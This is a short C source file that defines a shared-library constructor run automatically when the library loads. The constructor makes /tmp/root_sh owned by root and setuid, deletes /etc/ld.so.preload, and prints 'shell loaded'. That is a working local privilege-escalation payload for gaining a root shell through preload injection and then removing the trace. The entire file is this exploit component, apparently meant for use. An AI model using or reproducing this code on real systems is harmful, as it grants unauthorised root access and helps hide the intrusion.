//  SPDX-License-Identifier: BSD-3-Clause
// Copyright 2024 Catalin Iovita
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

__attribute__ ((__constructor__))

void libshell(void)
{
	chown("/tmp/root_sh", 0, 0);
	chmod("/tmp/root_sh", 04755);
	unlink("/etc/ld.so.preload");
	printf("[+] shell loaded!\n");
}
